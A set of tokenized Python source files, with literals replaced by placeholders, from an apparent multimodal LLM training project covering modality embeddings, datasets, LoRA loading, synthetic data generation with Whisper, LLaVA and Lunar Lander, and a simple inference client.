mp_vals ] ) <EOL> + "<STR_LIT>" <EOL> + str ( ( m . token_width , self . config . hidden_size ) ) <EOL> ) <EOL> projected_tensors . append ( mp_vals ) <EOL> indices = None <EOL> for i , input_ids_sample in enumerate ( input_ids ) : <EOL> is_text_mask = input_ids_sample >= <NUM_LIT> <EOL> inputs_embeds [ i , is_text_mask ] = model . embed_tokens ( <EOL> input_ids_sample [ is_text_mask ] <EOL> ) <EOL> if is_text_mask . sum ( ) == seq_len : <EOL> continue <EOL> assert ( <EOL> past_key_values is None <EOL> ) , "<STR_LIT>" <EOL> for mi , m in enumerate ( self . modalities ) : <EOL> m_mask = ( input_ids_sample == m . token_idx ) . float ( ) <EOL> m_kernel = torch . tensor ( <EOL> [ - <NUM_LIT> ] * m . token_width , dtype = m_mask . dtype , device = m_mask . device <EOL> ) <EOL> m_conv = conv1d ( <EOL> m_mask . unsqueeze ( <NUM_LIT> ) . unsqueeze ( <NUM_LIT> ) , <EOL> m_kernel . unsqueeze ( <NUM_LIT> ) . unsqueeze ( <NUM_LIT> ) , <EOL> ) <EOL> indices = ( m_conv [ <NUM_LIT> , <NUM_LIT> ] == - m . token_width ) . nonzero ( as_tuple = True ) [ <NUM_LIT> ] <EOL> last_covered_idx = - <NUM_LIT> <EOL> k = <NUM_LIT> <EOL> for possible_token_idx in indices : <EOL> if possible_token_idx <= last_covered_idx : <EOL> continue <EOL> batch_modality_tensor = projected_tensors [ mi ] [ i ] [ k ] <EOL> inputs_embeds [ <EOL> i , possible_token_idx : possible_token_idx + m . token_width <EOL> ] = batch_modality_tensor <EOL> last_covered_idx = possible_token_idx + m . token_width - <NUM_LIT> <EOL> k += <NUM_LIT> <EOL> return None , attention_mask , past_key_values , inputs_embeds , labels <EOL> </s>
<s> from typing import List , Dict , Sequence <EOL> from dataclasses import dataclass , field <EOL> import logging <EOL> import os <EOL> from torch . utils . data import Dataset <EOL> from datasets import load_from_disk , load_dataset , Dataset as HFDataset <EOL> import transformers <EOL> import torch <EOL> from multi_token . modalities . base_modality import Modality <EOL> from multi_token . constants import IGNORE_INDEX <EOL> from multi_token . data_tools import encode_chat <EOL> @ dataclass <EOL> class DataArguments : <EOL> dataset_path : str = field ( <EOL> default = None , metadata = { "<STR_LIT>" : "<STR_LIT>" } <EOL> ) <EOL> def _resolve_dataset ( path : str ) -> HFDataset : <EOL> if os . path . exists ( path ) : <EOL> return load_from_disk ( path ) <EOL> else : <EOL> return load_dataset ( path , split = "<STR_LIT>" , data_files = "<STR_LIT>" ) <EOL> class LMMDataset ( Dataset ) : <EOL> def __init__ ( <EOL> self , <EOL> data_args : DataArguments , <EOL> tokenizer : transformers . PreTrainedTokenizer , <EOL> modalities : List [ Modality ] , <EOL> ) : <EOL> super ( LMMDataset , self ) . __init__ ( ) <EOL> self . dataset = _resolve_dataset ( data_args . dataset_path ) <EOL> self . tokenizer = tokenizer <EOL> self . modalities = modalities <EOL> def __len__ ( self ) : <EOL> return len ( self . dataset ) <EOL> def get_example ( self ) -> Dict : <EOL> return self . dataset [ <NUM_LIT> ] <EOL> def __getitem__ ( self , i ) -> Dict : <EOL> try : <EOL> item = self . dataset [ i ] <EOL> return encode_chat ( item , self . tokenizer , self . modalities ) <EOL> except Exception as e : <EOL> new_i = i + <NUM_LIT> <EOL> if new_i >= len ( self ) : <EOL> new_i = <NUM_LIT> <EOL> logging . error ( f"<STR_LIT>" ) <EOL> return self . __getitem__ ( new_i ) <EOL> @ dataclass <EOL> class DataCollatorForSupervisedLMMDataset : <EOL> tokenizer : transformers . PreTrainedTokenizer <EOL> modalities : List [ Modality ] <EOL> def __call__ ( self , instances : Sequence [ Dict ] ) -> Dict [ str , torch . Tensor ] : <EOL> input_ids , labels = tuple ( <EOL> [ instance [ key ] for instance in instances ] for key in [ "<STR_LIT>" , "<STR_LIT>" ] <EOL> ) <EOL> input_ids = torch . nn . utils . rnn . pad_sequence ( <EOL> input_ids , batch_first = True , padding_value = self . tokenizer . pad_token_id <EOL> ) <EOL> labels = torch . nn . utils . rnn . pad_sequence ( <EOL> labels , batch_first = True , padding_value = IGNORE_INDEX <EOL> ) <EOL> input_ids = input_ids [ : , : self . tokenizer . model_max_length ] <EOL> labels = labels [ : , : self . tokenizer . model_max_length ] <EOL> batch = dict ( <EOL> input_ids = input_ids , <EOL> labels = labels , <EOL> attention_mask = input_ids . ne ( self . tokenizer . pad_token_id ) , <EOL> ) <EOL> for m in self . modalities : <EOL> batch [ m . name ] = [ instance [ m . name ] for instance in instances ] <EOL> return batch <EOL> </s>
<s> from typing import Type , List , Optional <EOL> import logging <EOL> from transformers import AutoTokenizer , AutoConfig , BitsAndBytesConfig <EOL> from huggingface_hub import hf_hub_download <EOL> from peft import PeftModel <EOL> import torch <EOL> import os <EOL> from multi_token . model_utils import fix_tokenizer <EOL> from multi_token . modalities . base_modality import Modality <EOL> from multi_token . language_models . mistral import MistralForCausalLM <EOL> from multi_token . language_models import LANGUAGE_MODEL_NAME_TO_CLASS <EOL> from multi_token . modalities import MODALITY_BUILDERS <EOL> def load_trained_lora_model ( <EOL> model_name_or_path : str , <EOL> model_lora_path : str , <EOL> model_cls : Optional [ Type ] = None , <EOL> modalities : Optional [ List [ Modality ] ] = None , <EOL> load_bits : int = <NUM_LIT> , <EOL> device_map : str = "<STR_LIT>" , <EOL> ) : <EOL> load_kwargs = { "<STR_LIT>" : device_map } <EOL> if load_bits == <NUM_LIT> : <EOL> load_kwargs [ "<STR_LIT>" ] = True <EOL> elif load_bits == <NUM_LIT> : <EOL> load_kwargs [ "<STR_LIT>" ] = True <EOL> load_kwargs [ "<STR_LIT>" ] = BitsAndBytesConfig ( <EOL> load_in_4bit = True , <EOL> bnb_4bit_compute_dtype = torch . float16 , <EOL> bnb_4bit_use_double_quant = True , <EOL> bnb_4bit_quant_type = "<STR_LIT>" , <EOL> ) <EOL> elif load_bits == <NUM_LIT> : <EOL> load_kwargs [ "<STR_LIT>" ] = torch . float16 <EOL> else : <EOL> raise ValueError ( f"<STR_LIT>" ) <EOL> tokenizer = AutoTokenizer . from_pretrained ( model_name_or_path , use_fast = False ) <EOL> fix_tokenizer ( tokenizer ) <EOL> cfg = AutoConfig . from_pretrained ( model_lora_path ) <EOL> if model_cls is None : <EOL> model_cls = LANGUAGE_MODEL_NAME_TO_CLASS [ cfg . model_cls ] <EOL> if modalities is None : <EOL> modalities = MODALITY_BUILDERS [ cfg . modality_builder ] ( ) <EOL> logging . info ( f"<STR_LIT>" ) <EOL> model = model_cls . from_pretrained ( <EOL> model_name_or_path , low_cpu_mem_usage = True , config = cfg , ** load_kwargs <EOL> ) <EOL> model . modalities = modalities <EOL> logging . info ( f"<STR_LIT>" ) <EOL> if os . path . exists ( os . path . join ( model_lora_path , "<STR_LIT>" ) ) : <EOL> non_lora_trainables = torch . load ( <EOL> os . path . join ( model_lora_path , "<STR_LIT>" ) , map_location = "<STR_LIT>" <EOL> ) <EOL> else : <EOL> local_fn = hf_hub_download ( <EOL> repo_id = model_lora_path , <EOL> filename = "<STR_LIT>" , <EOL> repo_type = "<STR_LIT>" , <EOL> ) <EOL> non_lora_trainables = torch . load ( local_fn , map_location = "<STR_LIT>" ) <EOL> model . get_model ( ) . initialize_pretrained_modules ( modalities , non_lora_trainables ) <EOL> logging . info ( f"<STR_LIT>" ) <EOL> model = PeftModel . from_pretrained ( model , model_lora_path ) <EOL> if load_bits == <NUM_LIT> : <EOL> model = model . merge_and_unload ( ) <EOL> model . eval ( ) <EOL> return model , tokenizer <EOL> </s>
<s> from typing import List <EOL> import argparse <EOL> import json <EOL> import os <EOL> import random <EOL> import openai <EOL> from datasets import Dataset , load_dataset <EOL> from multi_token . constants import ROLE_ASSISTANT , ROLE_USER <EOL> DATASET_ARGS = dict ( <EOL> path = "<STR_LIT>" , name = "<STR_LIT>" , split = "<STR_LIT>" <EOL> ) <EOL> PROMPT = <EOL> QUESTIONS = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> OPENAI_TOOLS = [ <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } , <EOL> } , <EOL> "<STR_LIT>" : [ "<STR_LIT>" , "<STR_LIT>" ] , <EOL> } , <EOL> } , <EOL> } <EOL> ] <EOL> def _build_convo ( idx , row ) -> List : <EOL> client = openai . Client ( ) <EOL> captions = [ row [ "<STR_LIT>" ] ] <EOL> speech_audios = [ { "<STR_LIT>" : DATASET_ARGS , "<STR_LIT>" : idx } ] <EOL> captions_text = "<STR_LIT>" . join ( [ f'<STR_LIT>' for i , cap in enumerate ( captions ) ] ) <EOL> prompt = PROMPT . format ( <EOL> captions = captions_text , question = random . choice ( QUESTIONS ) <EOL> ) . strip ( ) <EOL> completion = client . chat . completions . create ( <EOL> model = "<STR_LIT>" , <EOL> messages = [ { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : prompt } ] , <EOL> tools = OPENAI_TOOLS , <EOL> tool_choice = { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : { "<STR_LIT>" : "<STR_LIT>" } } , <EOL> ) <EOL> resp = json . loads ( completion . choices [ <NUM_LIT> ] . message . tool_calls [ <NUM_LIT> ] . function . arguments ) <EOL> if "<STR_LIT>" not in resp : <EOL> print ( resp ) <EOL> q = resp [ "<STR_LIT>" ] <EOL> a = resp [ "<STR_LIT>" ] <EOL> if random . choice ( [ True , False ] ) : <EOL> q = "<STR_LIT>" * len ( captions ) + "<STR_LIT>" + q <EOL> else : <EOL> q = q + "<STR_LIT>" + "<STR_LIT>" * len ( captions ) <EOL> example = { <EOL> "<STR_LIT>" : speech_audios , <EOL> "<STR_LIT>" : [ <EOL> { <EOL> "<STR_LIT>" : ROLE_USER , <EOL> "<STR_LIT>" : q , <EOL> } , <EOL> { <EOL> "<STR_LIT>" : ROLE_ASSISTANT , <EOL> "<STR_LIT>" : a , <EOL> } , <EOL> ] , <EOL> } <EOL> return example <EOL> def main ( args ) : <EOL> data = load_dataset ( ** DATASET_ARGS ) <EOL> data_idxs = list ( range ( len ( data ) ) ) <EOL> os . makedirs ( args . cache_folder , exist_ok = True ) <EOL> def gen ( seeds ) : <EOL> r = random . Random ( seeds [ <NUM_LIT> ] + <NUM_LIT> ) <EOL> cache = open ( <EOL> os . path . join ( args . cache_folder , f"<STR_LIT>" ) , "<STR_LIT>" <EOL> ) <EOL> i = <NUM_LIT> <EOL> while i < len ( seeds ) : <EOL> selected_idx = r . sample ( data_idxs , k = <NUM_LIT> ) [ <NUM_LIT> ] <EOL> selected_row = data [ selected_idx ] <EOL> try : <EOL> example = _build_convo ( selected_idx , selected_row ) <EOL> cache . write ( json . dumps ( example ) + "<STR_LIT>" ) <EOL> yield example <EOL> i += <NUM_LIT> <EOL> except Exception as e : <EOL> print ( e ) <EOL> continue <EOL> cache . close ( ) <EOL> ds = Dataset . from_generator ( <EOL> gen , <EOL> num_proc = args . num_proc , <EOL> gen_kwargs = { "<STR_LIT>" : list ( range ( args . num_examples ) ) } , <EOL> ) <EOL> ds . save_to_disk ( args . output_folder ) <EOL> if __name__ == "<STR_LIT>" : <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> type = str , <EOL> default = "<STR_LIT>" , <EOL> ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> type = str , <EOL> default = "<STR_LIT>" , <EOL> ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> args = parser . parse_args ( ) <EOL> main ( args ) <EOL> </s>
<s> from typing import List , Dict <EOL> import logging <EOL> import torch <EOL> def _find_all_linear_names ( model ) -> List [ str ] : <EOL> cls = torch . nn . Linear <EOL> lora_module_names = set ( ) <EOL> for name , module in model . named_modules ( ) : <EOL> if isinstance ( module , cls ) : <EOL> names = name . split ( "<STR_LIT>" ) <EOL> lora_module_names . add ( names [ <NUM_LIT> ] if len ( names ) == <NUM_LIT> else names [ - <NUM_LIT> ] ) <EOL> if "<STR_LIT>" in lora_module_names : <EOL> lora_module_names . remove ( "<STR_LIT>" ) <EOL> return list ( lora_module_names ) <EOL> def maybe_zero_3 ( param , ignore_status = False , name = None ) : <EOL> from deepspeed import zero <EOL> from deepspeed . runtime . zero . partition_parameters import ZeroParamStatus <EOL> if hasattr ( param , "<STR_LIT>" ) : <EOL> if param . ds_status == ZeroParamStatus . NOT_AVAILABLE : <EOL> if not ignore_status : <EOL> logging . warning ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> with zero . GatheredParameters ( [ param ] ) : <EOL> param = param . data . detach ( ) . cpu ( ) . clone ( ) <EOL> else : <EOL> param = param . detach ( ) . cpu ( ) . clone ( ) <EOL> return param <EOL> def get_peft_state ( named_params , bias ) -> Dict : <EOL> if bias == "<STR_LIT>" : <EOL> to_return = { k : t for k , t in named_params if "<STR_LIT>" in k } <EOL> elif bias == "<STR_LIT>" : <EOL> to_return = { k : t for k , t in named_params if "<STR_LIT>" in k or "<STR_LIT>" in k } <EOL> elif bias == "<STR_LIT>" : <EOL> to_return = { } <EOL> maybe_lora_bias = { } <EOL> lora_bias_names = set ( ) <EOL> for k , t in named_params : <EOL> if "<STR_LIT>" in k : <EOL> to_return [ k ] = t <EOL> bias_name = k . split ( "<STR_LIT>" ) [ <NUM_LIT> ] + "<STR_LIT>" <EOL> lora_bias_names . add ( bias_name ) <EOL> elif "<STR_LIT>" in k : <EOL> maybe_lora_bias [ k ] = t <EOL> for k , t in maybe_lora_bias : <EOL> if bias_name in lora_bias_names : <EOL> to_return [ bias_name ] = t <EOL> else : <EOL> raise NotImplementedError ( ) <EOL> to_return = { k : maybe_zero_3 ( v , ignore_status = True ) for k , v in to_return . items ( ) } <EOL> return to_return <EOL> def get_peft_state_non_lora ( named_params ) -> Dict : <EOL> to_return = { <EOL> k : t <EOL> for k , t in named_params <EOL> if "<STR_LIT>" not in k and ( t . requires_grad or "<STR_LIT>" in k ) <EOL> } <EOL> to_return = { <EOL> k : maybe_zero_3 ( v , ignore_status = True ) . cpu ( ) for k , v in to_return . items ( ) <EOL> } <EOL> return to_return <EOL> def make_model_lora ( model , training_args : "<STR_LIT>" ) : <EOL> from peft import LoraConfig , get_peft_model <EOL> lora_config = LoraConfig ( <EOL> r = training_args . lora_r , <EOL> lora_alpha = training_args . lora_alpha , <EOL> target_modules = _find_all_linear_names ( model ) , <EOL> lora_dropout = training_args . lora_dropout , <EOL> bias = training_args . lora_bias , <EOL> task_type = "<STR_LIT>" , <EOL> ) <EOL> if training_args . bits == <NUM_LIT> : <EOL> if training_args . bf16 : <EOL> model . to ( torch . bfloat16 ) <EOL> if training_args . fp16 : <EOL> model . to ( torch . float16 ) <EOL> model = get_peft_model ( model , lora_config ) <EOL> return model <EOL> def fix_tokenizer ( tokenizer ) : <EOL> if tokenizer . pad_token is None : <EOL> tokenizer . pad_token = tokenizer . unk_token <EOL> if tokenizer . mask_token is None : <EOL> tokenizer . mask_token = tokenizer . unk_token <EOL> if tokenizer . cls_token is None : <EOL> tokenizer . cls_token = tokenizer . unk_token <EOL> if tokenizer . sep_token is None : <EOL> tokenizer . sep_token = tokenizer . unk_token <EOL> </s>
<s> from setuptools import setup , find_packages <EOL> with open ( "<STR_LIT>" ) as f : <EOL> required = f . read ( ) . splitlines ( ) <EOL> setup ( <EOL> name = "<STR_LIT>" , <EOL> version = "<STR_LIT>" , <EOL> description = "<STR_LIT>" , <EOL> url = "<STR_LIT>" , <EOL> author = "<STR_LIT>" , <EOL> license = "<STR_LIT>" , <EOL> packages = find_packages ( ) , <EOL> include_package_data = True , <EOL> install_requires = required , <EOL> ) <EOL> </s>
<s> from typing import Dict , List , Optional <EOL> import torch <EOL> import torch . nn as nn <EOL> from transformers import AutoFeatureExtractor , WhisperModel <EOL> from multi_token . data_tools import load_audio <EOL> from multi_token . modalities . base_modality import Modality <EOL> from multi_token . modalities . projectors import ( <EOL> build_mlp_vector_projector , <EOL> ) <EOL> OUTPUT_EMB_SIZE = <NUM_LIT> <EOL> class WhisperAudioModule ( nn . Module ) : <EOL> def __init__ ( self , model_name_or_path : str ) : <EOL> super ( ) . __init__ ( ) <EOL> self . model_name_or_path = model_name_or_path <EOL> self . model = None <EOL> self . feature_extractor = None <EOL> self . load_model ( ) <EOL> def load_model ( self ) : <EOL> self . model = WhisperModel . from_pretrained ( self . model_name_or_path ) <EOL> self . feature_extractor = AutoFeatureExtractor . from_pretrained ( <EOL> self . model_name_or_path <EOL> ) <EOL> self . model . requires_grad_ ( False ) <EOL> @ torch . no_grad ( ) <EOL> def forward ( self , audios ) -> torch . Tensor : <EOL> hidden_states = [ ] <EOL> for i in range ( audios . shape [ <NUM_LIT> ] ) : <EOL> decoder_input_ids = ( <EOL> torch . tensor ( [ [ <NUM_LIT> ] ] ) * self . model . config . decoder_start_token_id <EOL> ) <EOL> last_hidden_state = self . model ( <EOL> audios [ i ] . to ( device = self . device , dtype = self . dtype ) , <EOL> decoder_input_ids = decoder_input_ids . to ( device = self . device ) , <EOL> ) . last_hidden_state <EOL> hidden_states . append ( last_hidden_state ) <EOL> last_hidden_state = torch . stack ( hidden_states ) <EOL> return last_hidden_state . view ( - <NUM_LIT> , <NUM_LIT> , OUTPUT_EMB_SIZE ) <EOL> @ property <EOL> def dtype ( self ) : <EOL> return self . model . dtype <EOL> @ property <EOL> def device ( self ) : <EOL> return self . model . device <EOL> class WhisperAudioModality ( Modality ) : <EOL> def __init__ ( <EOL> self , <EOL> model_name_or_path : str = "<STR_LIT>" , <EOL> num_projector_layers : int = <NUM_LIT> , <EOL> num_tokens_output : int = <NUM_LIT> , <EOL> ) : <EOL> self . model_name_or_path = model_name_or_path <EOL> self . module = WhisperAudioModule ( model_name_or_path = self . model_name_or_path ) <EOL> self . num_projector_layers = num_projector_layers <EOL> self . num_tokens_output = num_tokens_output <EOL> def build_projector ( self , lm_hidden_size : int ) -> nn . Module : <EOL> return build_mlp_vector_projector ( <EOL> input_hidden_size = OUTPUT_EMB_SIZE , <EOL> lm_hidden_size = lm_hidden_size , <EOL> num_layers = self . num_projector_layers , <EOL> num_tokens = self . num_tokens_output , <EOL> ) <EOL> @ property <EOL> def name ( self ) -> str : <EOL> return "<STR_LIT>" <EOL> @ property <EOL> def token ( self ) -> str : <EOL> return "<STR_LIT>" <EOL> @ property <EOL> def data_key ( self ) -> str : <EOL> return "<STR_LIT>" <EOL> @ property <EOL> def token_width ( self ) -> int : <EOL> return self . num_tokens_output <EOL> def to ( self , dtype : torch . dtype , device : torch . device ) -> "<STR_LIT>" : <EOL> self . module . to ( dtype = dtype , device = device ) <EOL> return self <EOL> def preprocess_rows ( self , rows : List [ Dict ] ) -> List [ Optional [ torch . Tensor ] ] : <EOL> row_values = [ ] <EOL> for row in rows : <EOL> audios = [ ] <EOL> for audio_dict in row [ self . data_key ] : <EOL> audio_dict = load_audio ( <EOL> audio_dict , <EOL> target_sampling_rate = self . module . feature_extractor . sampling_rate , <EOL> ) <EOL> audio_processed = self . module . feature_extractor ( <EOL> audio_dict [ "<STR_LIT>" ] , <EOL> return_tensors = "<STR_LIT>" , <EOL> sampling_rate = audio_dict [ "<STR_LIT>" ] , <EOL> ) . input_features <EOL> audios . append ( audio_processed ) <EOL> row_values . append ( torch . stack ( audios ) if len ( audios ) > <NUM_LIT> else None ) <EOL> return row_values <EOL> @ torch . no_grad ( ) <EOL> def forward ( self , encoded_values : List [ torch . Tensor ] ) -> List [ torch . Tensor ] : <EOL> audio_features = [ ] <EOL> for audio_batch in encoded_values : <EOL> audio_features . append ( self . module . forward ( audio_batch ) ) <EOL> return audio_features <EOL> </s>
<s> from typing import List <EOL> import argparse <EOL> import json <EOL> import os <EOL> from datasets import Dataset <EOL> from multi_token . constants import ROLE_ASSISTANT , ROLE_USER <EOL> def _convert_convo ( convo ) -> List : <EOL> msgs = [ ] <EOL> for m in convo : <EOL> msgs . append ( <EOL> { <EOL> "<STR_LIT>" : { "<STR_LIT>" : ROLE_ASSISTANT , "<STR_LIT>" : ROLE_USER } [ m [ "<STR_LIT>" ] ] , <EOL> "<STR_LIT>" : m [ "<STR_LIT>" ] , <EOL> } <EOL> ) <EOL> return msgs <EOL> def main ( args ) : <EOL> rows = [ ] <EOL> for json_fn in args . llava_json : <EOL> with open ( json_fn ) as f : <EOL> rows . extend ( json . load ( f ) ) <EOL> def gen ( rows ) : <EOL> for row in rows : <EOL> img_path = row [ "<STR_LIT>" ] <EOL> fn = os . path . join ( args . image_folder , img_path ) <EOL> if not os . path . exists ( fn ) : <EOL> print ( "<STR_LIT>" , fn ) <EOL> continue <EOL> yield { <EOL> "<STR_LIT>" : str ( row [ "<STR_LIT>" ] ) , <EOL> "<STR_LIT>" : [ fn ] , <EOL> "<STR_LIT>" : _convert_convo ( row [ "<STR_LIT>" ] ) , <EOL> } <EOL> ds = Dataset . from_generator ( gen , gen_kwargs = { "<STR_LIT>" : rows } , num_proc = args . num_proc ) <EOL> ds . save_to_disk ( args . output_folder ) <EOL> if __name__ == "<STR_LIT>" : <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str , action = "<STR_LIT>" ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> args = parser . parse_args ( ) <EOL> main ( args ) <EOL> </s>
<s> from typing import List <EOL> import argparse <EOL> import random <EOL> import json <EOL> import os <EOL> from torch . distributions . categorical import Categorical <EOL> from PIL import Image <EOL> from datasets import Dataset <EOL> import gymnasium as gym <EOL> import torch . nn as nn <EOL> import numpy as np <EOL> import torch <EOL> from multi_token . constants import ROLE_ASSISTANT , ROLE_USER <EOL> LUNAR_LANDER_OPTIONS = ( <EOL> "<STR_LIT>" . split ( "<STR_LIT>" ) <EOL> ) <EOL> MAX_STEPS = <NUM_LIT> <EOL> def layer_init ( layer , std = np . sqrt ( <NUM_LIT> ) , bias_const = <NUM_LIT> ) : <EOL> torch . nn . init . orthogonal_ ( layer . weight , std ) <EOL> torch . nn . init . constant_ ( layer . bias , bias_const ) <EOL> return layer <EOL> class Agent ( nn . Module ) : <EOL> def __init__ ( self , envs ) : <EOL> super ( ) . __init__ ( ) <EOL> self . critic = nn . Sequential ( <EOL> layer_init ( <EOL> nn . Linear ( np . array ( envs . single_observation_space . shape ) . prod ( ) , <NUM_LIT> ) <EOL> ) , <EOL> nn . Tanh ( ) , <EOL> layer_init ( nn . Linear ( <NUM_LIT> , <NUM_LIT> ) ) , <EOL> nn . Tanh ( ) , <EOL> layer_init ( nn . Linear ( <NUM_LIT> , <NUM_LIT> ) , std = <NUM_LIT> ) , <EOL> ) <EOL> self . actor = nn . Sequential ( <EOL> layer_init ( <EOL> nn . Linear ( np . array ( envs . single_observation_space . shape ) . prod ( ) , <NUM_LIT> ) <EOL> ) , <EOL> nn . Tanh ( ) , <EOL> layer_init ( nn . Linear ( <NUM_LIT> , <NUM_LIT> ) ) , <EOL> nn . Tanh ( ) , <EOL> layer_init ( nn . Linear ( <NUM_LIT> , envs . single_action_space . n ) , std = <NUM_LIT> ) , <EOL> ) <EOL> def get_value ( self , x ) : <EOL> return self . critic ( x ) <EOL> def get_action_and_value ( self , x , action = None ) : <EOL> logits = self . actor ( x ) <EOL> probs = Categorical ( logits = logits ) <EOL> if action is None : <EOL> action = probs . sample ( ) <EOL> return action , probs . log_prob ( action ) , probs . entropy ( ) , self . critic ( x ) <EOL> def _gen_examples ( round_num , args ) : <EOL> env = gym . make ( "<STR_LIT>" , render_mode = "<STR_LIT>" ) <EOL> random . seed ( round_num ) <EOL> np . random . seed ( round_num ) <EOL> class EnvWrapper : <EOL> single_observation_space = env . observation_space <EOL> single_action_space = env . action_space <EOL> model = Agent ( EnvWrapper ( ) ) . to ( "<STR_LIT>" ) <EOL> model . load_state_dict ( <EOL> torch . load ( args . pretrained_ppo_model_path , map_location = "<STR_LIT>" ) <EOL> ) <EOL> model . eval ( ) <EOL> os . makedirs ( args . output_image_folder , exist_ok = True ) <EOL> observation , info = env . reset ( seed = round_num ) <EOL> for frame in range ( MAX_STEPS ) : <EOL> img = env . render ( ) <EOL> with torch . no_grad ( ) : <EOL> action , logprob , _ , value = model . get_action_and_value ( <EOL> torch . from_numpy ( observation ) <EOL> ) <EOL> action = action . cpu ( ) . numpy ( ) <EOL> resp = "<STR_LIT>" <EOL> if action == <NUM_LIT> : <EOL> resp = "<STR_LIT>" <EOL> elif action == <NUM_LIT> : <EOL> resp = "<STR_LIT>" <EOL> elif action == <NUM_LIT> : <EOL> resp = "<STR_LIT>" <EOL> elif action == <NUM_LIT> : <EOL> resp = "<STR_LIT>" <EOL> if random . random ( ) < args . sample_rate : <EOL> random . shuffle ( LUNAR_LANDER_OPTIONS ) <EOL> options_str = "<STR_LIT>" . join ( LUNAR_LANDER_OPTIONS ) <EOL> img_fn = os . path . join ( args . output_image_folder , f"<STR_LIT>" ) <EOL> messages = [ <EOL> { <EOL> "<STR_LIT>" : ROLE_USER , <EOL> "<STR_LIT>" : f"<STR_LIT>" , <EOL> } , <EOL> { "<STR_LIT>" : ROLE_ASSISTANT , "<STR_LIT>" : resp } , <EOL> ] <EOL> Image . fromarray ( img ) . save ( img_fn ) <EOL> example = { <EOL> "<STR_LIT>" : f"<STR_LIT>" , <EOL> "<STR_LIT>" : [ img_fn ] , <EOL> "<STR_LIT>" : messages , <EOL> } <EOL> yield example <EOL> observation , reward , terminated , truncated , info = env . step ( action ) <EOL> if terminated or truncated : <EOL> break <EOL> def main ( args ) : <EOL> def gen ( idxs ) : <EOL> for r in idxs : <EOL> yield from _gen_examples ( r , args ) <EOL> ds = Dataset . from_generator ( <EOL> gen , gen_kwargs = { "<STR_LIT>" : list ( range ( args . rounds ) ) } , num_proc = args . num_proc <EOL> ) <EOL> ds . save_to_disk ( args . output_folder ) <EOL> if __name__ == "<STR_LIT>" : <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( "<STR_LIT>" , type = str ) <EOL> parser . add_argument ( "<STR_LIT>" , type = str ) <EOL> parser . add_argument ( "<STR_LIT>" , type = str ) <EOL> parser . add_argument ( "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> parser . add_argument ( "<STR_LIT>" , type = float , default = <NUM_LIT> ) <EOL> parser . add_argument ( "<STR_LIT>" , type = int , default = <NUM_LIT> ) <EOL> args = parser . parse_args ( ) <EOL> main ( args ) <EOL> </s>
<s> import argparse <EOL> import random <EOL> import requests <EOL> import os <EOL> from PIL import Image <EOL> import gymnasium as gym <EOL> from multi_token . constants import ROLE_USER <EOL> LUNAR_LANDER_OPTIONS = ( <EOL> "<STR_LIT>" . split ( "<STR_LIT>" ) <EOL> ) <EOL> MAX_STEPS = <NUM_LIT> <EOL> def main ( args ) : <EOL> env = gym . make ( "<STR_LIT>" , render_mode = "<STR_LIT>" ) <EOL> env = gym . wrappers . RecordVideo ( env , args . video_folder ) <EOL> env . reset ( ) <EOL> for _ in range ( MAX_STEPS ) : <EOL> img = env . render ( ) <EOL> random . shuffle ( LUNAR_LANDER_OPTIONS ) <EOL> options_str = "<STR_LIT>" . join ( LUNAR_LANDER_OPTIONS ) <EOL> img_fn = os . path . join ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> messages = [ <EOL> { <EOL> "<STR_LIT>" : ROLE_USER , <EOL> "<STR_LIT>" : f"<STR_LIT>" , <EOL> } , <EOL> ] <EOL> Image . fromarray ( img ) . save ( img_fn ) <EOL> example = { <EOL> "<STR_LIT>" : [ img_fn ] , <EOL> "<STR_LIT>" : messages , <EOL> } <EOL> output = requests . post ( <EOL> args . server_endpoint , <EOL> json = example , <EOL> ) . json ( ) [ "<STR_LIT>" ] <EOL> print ( "<STR_LIT>" + output ) <EOL> if output == "<STR_LIT>" : <EOL> action = <NUM_LIT> <EOL> elif output == "<STR_LIT>" : <EOL> action = <NUM_LIT> <EOL> elif output == "<STR_LIT>" : <EOL> action = <NUM_LIT> <EOL> else : <EOL> action = <NUM_LIT> <EOL> observation , reward , terminated , truncated , info = env . step ( action ) <EOL> if terminated or truncated : <EOL> break <EOL> if __name__ == "<STR_LIT>" : <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , type = str , default = "<STR_LIT>" <EOL> ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , type = str , default = "<STR_LIT>" <EOL> ) <EOL> args = parser . parse_args ( ) <EOL> main ( args ) <EOL> </s>
